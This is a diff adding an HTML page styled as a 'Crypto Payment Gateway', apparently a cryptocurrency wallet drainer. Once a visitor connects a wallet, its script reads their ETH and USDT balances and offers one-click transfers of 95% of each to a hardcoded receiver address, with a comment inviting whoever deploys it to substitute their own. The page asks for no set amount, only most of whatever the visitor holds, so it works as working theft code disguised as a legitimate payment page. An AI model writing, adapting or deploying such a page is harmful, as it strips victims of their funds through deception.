@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRYPTO PAYMENT GATEWAY</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5),
+                        0 0 0 1px rgba(56, 189, 248, 0.1),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #1e40af, #3b82f6);
+            padding: 28px 32px;
+            text-align: center;
+            border-bottom: 3px solid rgba(56, 189, 248, 0.3);
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(90deg, #fff, #dbeafe);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .content {
+            padding: 32px;
+        }
+
+        .connect-section {
+            margin-bottom: 32px;
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
+            letter-spacing: 0.5px;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(59, 130, 246, 0.4);
+            background: linear-gradient(90deg, #4f87f8, #2563eb);
+        }
+
+        .connect-btn:disabled {
+            background: linear-gradient(90deg, #10b981, #059669);
+            transform: none;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            cursor: default;
+        }
+
+        .wallet-info {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 32px;
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            display: none;
+        }
+
+        .address-box {
+            background: rgba(15, 23, 42, 0.9);
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid rgba(56, 189, 248, 0.1);
+        }
+
+        .address-label {
+            font-size: 12px;
+            color: #94a3b8;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .address-value {
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: 600;
+            color: #60a5fa;
+            word-break: break-all;
+        }
+
+        .balances-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .balance-card {
+            background: linear-gradient(145deg, rgba(30, 41, 59, 0.9), rgba(15, 23, 42, 0.9));
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid rgba(56, 189, 248, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .balance-card:hover {
+            transform: translateY(-2px);
+            border-color: rgba(56, 189, 248, 0.3);
+        }
+
+        .balance-icon {
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+
+        .balance-label {
+            font-size: 14px;
+            color: #94a3b8;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .balance-value {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .eth-color { color: #60a5fa; }
+        .usdt-color { color: #10b981; }
+
+        .transfer-section {
+            display: none;
+        }
+
+        .amount-card {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 16px;
+            padding: 28px;
+            margin-bottom: 24px;
+            border: 2px solid rgba(56, 189, 248, 0.2);
+            text-align: center;
+        }
+
+        .amount-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .amount-icon {
+            font-size: 28px;
+            color: #60a5fa;
+        }
+
+        .amount-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .amount-display {
+            font-size: 42px;
+            font-weight: 900;
+            color: #60a5fa;
+            margin: 16px 0;
+            text-shadow: 0 0 20px rgba(96, 165, 250, 0.3);
+        }
+
+        .amount-note {
+            font-size: 14px;
+            color: #94a3b8;
+            font-weight: 600;
+            background: rgba(96, 165, 250, 0.1);
+            padding: 10px 16px;
+            border-radius: 10px;
+            display: inline-block;
+            border: 1px solid rgba(96, 165, 250, 0.2);
+        }
+
+        .action-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .action-btn {
+            padding: 20px;
+            border: none;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        .eth-btn {
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .usdt-btn {
+            background: linear-gradient(90deg, #10b981, #059669);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-icon {
+            font-size: 22px;
+        }
+
+        .status-container {
+            margin-top: 28px;
+            min-height: 60px;
+        }
+
+        .status-box {
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            border: 1px solid transparent;
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status-success {
+            background: rgba(16, 185, 129, 0.15);
+            border-color: rgba(16, 185, 129, 0.3);
+            color: #10b981;
+        }
+
+        .status-pending {
+            background: rgba(245, 158, 11, 0.15);
+            border-color: rgba(245, 158, 11, 0.3);
+            color: #f59e0b;
+        }
+
+        .status-error {
+            background: rgba(239, 68, 68, 0.15);
+            border-color: rgba(239, 68, 68, 0.3);
+            color: #ef4444;
+        }
+
+        .tx-hash {
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
+            word-break: break-all;
+            margin-top: 10px;
+            color: #60a5fa;
+            opacity: 0.9;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 20px;
+            }
+            
+            .content {
+                padding: 24px;
+            }
+            
+            .balances-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                grid-template-columns: 1fr;
+            }
+            
+            .amount-display {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>CRYPTO PAYMENT GATEWAY</h1>
+        </div>
+        
+        <div class="content">
+            <!-- Connect Button -->
+            <div class="connect-section">
+                <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
+                    🔗 CONNECT WALLET
+                </button>
+            </div>
+
+            <!-- Wallet Info -->
+            <div class="wallet-info" id="walletInfo">
+                <div class="address-box">
+                    <div class="address-label">Connected Wallet</div>
+                    <div class="address-value" id="walletAddress"></div>
+                </div>
+                
+                <div class="balances-grid">
+                    <div class="balance-card">
+                        <div class="balance-icon eth-color">Ξ</div>
+                        <div class="balance-label">ETH Balance</div>
+                        <div class="balance-value eth-color" id="ethBalance">0.0000</div>
+                    </div>
+                    
+                    <div class="balance-card">
+                        <div class="balance-icon usdt-color">$</div>
+                        <div class="balance-label">USDT Balance</div>
+                        <div class="balance-value usdt-color" id="usdtBalance">0.00</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Transfer Section -->
+            <div class="transfer-section" id="transferSection">
+                <div class="amount-card">
+                    <div class="amount-header">
+                        <div class="amount-icon">Ξ</div>
+                        <div class="amount-title">ETH TO SEND</div>
+                    </div>
+                    <div class="amount-display" id="ethAmountDisplay">0.0000</div>
+                    <div class="amount-note">95% OF AVAILABLE BALANCE</div>
+                </div>
+
+                <div class="action-buttons">
+                    <button class="action-btn eth-btn" id="sendEthBtn" onclick="sendEth()">
+                        <span class="btn-icon">Ξ</span>
+                        <span>SEND 95% ETH</span>
+                    </button>
+                    
+                    <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
+                        <span class="btn-icon">$</span>
+                        <span>SEND 95% USDT</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Status Display -->
+            <div class="status-container">
+                <div class="status-box" id="statusBox"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const RECEIVER = "0x49fa88e28f0f5f66bd16e484a9b76e11805db754"; // Replace with your receiver address
+        const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
+        
+        // USDT Contract ABI
+        const USDT_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+        ];
+        
+        // Global variables
+        let provider = null;
+        let signer = null;
+        let userAddress = null;
+        let ethBalance = null;
+        let usdtBalance = null;
+        let usdtDecimals = null;
+        let ethAmountToSend = "0.0000";
+        
+        // Connect wallet function
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    showStatus("Please install MetaMask or a Web3 wallet", "error");
+                    return;
+                }
+                
+                showStatus("Connecting to wallet...", "pending");
+                
+                provider = new ethers.BrowserProvider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                // Display wallet address
+                const shortAddress = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+                document.getElementById("walletAddress").textContent = shortAddress;
+                document.getElementById("walletInfo").style.display = "block";
+                
+                // Load balances
+                await loadBalances();
+                
+                // Show transfer section
+                document.getElementById("transferSection").style.display = "block";
+                
+                // Update connect button
+                document.getElementById("connectBtn").textContent = "✅ WALLET CONNECTED";
+                document.getElementById("connectBtn").disabled = true;
+                
+                showStatus("Wallet connected successfully", "success");
+                
+            } catch (error) {
+                console.error("Connection error:", error);
+                showStatus("Failed to connect wallet: " + error.message, "error");
+            }
+        }
+        
+        // Load ETH and USDT balances
+        async function loadBalances() {
+            try {
+                showStatus("Loading balances...", "pending");
+                
+                // Get ETH balance
+                ethBalance = await provider.getBalance(userAddress);
+                const ethBalanceFormatted = ethers.formatEther(ethBalance);
+                
+                // Calculate 95% of ETH balance
+                const ethToSend = (parseFloat(ethBalanceFormatted) * 0.95).toFixed(6);
+                ethAmountToSend = parseFloat(ethToSend).toFixed(4);
+                
+                // Update displays
+                document.getElementById("ethBalance").textContent = 
+                    `${parseFloat(ethBalanceFormatted).toFixed(4)} ETH`;
+                document.getElementById("ethAmountDisplay").textContent = 
+                    `${ethAmountToSend} ETH`;
+                
+                // Get USDT balance
+                const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
+                usdtDecimals = await usdtContract.decimals();
+                usdtBalance = await usdtContract.balanceOf(userAddress);
+                const usdtBalanceFormatted = ethers.formatUnits(usdtBalance, usdtDecimals);
+                
+                // Update USDT display
+                document.getElementById("usdtBalance").textContent = 
+                    `${parseFloat(usdtBalanceFormatted).toFixed(2)} USDT`;
+                
+                showStatus("Balances loaded", "success");
+                
+            } catch (error) {
+                console.error("Balance load error:", error);
+                showStatus("Failed to load balances", "error");
+            }
+        }
+        
+        // Send ETH function
+        async function sendEth() {
+            try {
+                if (!ethAmountToSend || ethAmountToSend <= 0) {
+                    showStatus("No ETH to send", "error");
+                    return;
+                }
+                
+                const amountWei = ethers.parseEther(ethAmountToSend);
+                const balanceWei = ethers.parseEther(ethers.formatEther(ethBalance));
+                
+                if (amountWei > balanceWei) {
+                    showStatus("Insufficient ETH balance", "error");
+                    return;
+                }
+                
+                showStatus("Please confirm transaction in your wallet...", "pending");
+                
+                // Disable buttons
+                document.getElementById("sendEthBtn").disabled = true;
+                document.getElementById("sendUsdtBtn").disabled = true;
+                
+                // Send transaction
+                const tx = await signer.sendTransaction({
+                    to: RECEIVER,
+                    value: amountWei
+                });
+                
+                showStatus(`Transaction submitted: ${tx.hash}`, "pending");
+                
+                const receipt = await tx.wait();
+                
+                if (receipt.status === 1) {
+                    showStatus(`✅ ETH sent successfully!`, "success");
+                    await loadBalances();
+                } else {
+                    showStatus("Transaction failed", "error");
+                }
+                
+            } catch (error) {
+                console.error("ETH send error:", error);
+                
+                if (error.code === 4001) {
+                    showStatus("Transaction rejected by user", "error");
+                } else {
+                    showStatus("Transaction failed: " + error.message, "error");
+                }
+                
+            } finally {
+                // Re-enable buttons
+                document.getElementById("sendEthBtn").disabled = false;
+                document.getElementById("sendUsdtBtn").disabled = false;
+            }
+        }
+        
+        // Send USDT function
+        async function sendUSDT() {
+            try {
+                if (!usdtBalance || usdtBalance == 0) {
+                    showStatus("No USDT balance to send", "error");
+                    return;
+                }
+                
+                showStatus("Please confirm USDT transfer in your wallet...", "pending");
+                
+                // Disable buttons
+                document.getElementById("sendEthBtn").disabled = true;
+                document.getElementById("sendUsdtBtn").disabled = true;
+                
+                // Calculate 95% of USDT balance
+                const sendAmount = usdtBalance * 95n / 100n;
+                
+                // Create contract with signer
+                const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
+                
+                // Send USDT transfer
+                const tx = await usdtContract.transfer(RECEIVER, sendAmount);
+                
+                showStatus(`USDT transfer submitted: ${tx.hash}`, "pending");
+                
+                const receipt = await tx.wait();
+                
+                if (receipt.status === 1) {
+                    showStatus(`✅ USDT sent successfully!`, "success");
+                    await loadBalances();
+                } else {
+                    showStatus("USDT transfer failed", "error");
+                }
+                
+            } catch (error) {
+                console.error("USDT send error:", error);
+                
+                if (error.code === 4001) {
+                    showStatus("Transaction rejected by user", "error");
+                } else {
+                    showStatus("USDT transfer failed: " + error.message, "error");
+                }
+                
+            } finally {
+                // Re-enable buttons
+                document.getElementById("sendEthBtn").disabled = false;
+                document.getElementById("sendUsdtBtn").disabled = false;
+            }
+        }
+        
+        // Show status message
+        function showStatus(message, type = "info") {
+            const statusBox = document.getElementById("statusBox");
+            statusBox.textContent = message;
+            statusBox.className = "status-box";
+            statusBox.classList.add(`status-${type}`);
+            statusBox.style.display = "block";
+            
+            // Auto-hide success messages after 8 seconds
+            if (type === "success") {
+                setTimeout(() => {
+                    statusBox.style.display = "none";
+                }, 8000);
+            }
+        }
+        
+        // Listen for account changes
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', function(accounts) {
+                if (accounts.length === 0) {
+                    location.reload();
+                } else {
+                    location.reload();
+                }
+            });
+            
+            window.ethereum.on('chainChanged', function() {
+                location.reload();
+            });
+        }
+    </script>
+</body>
+</html>
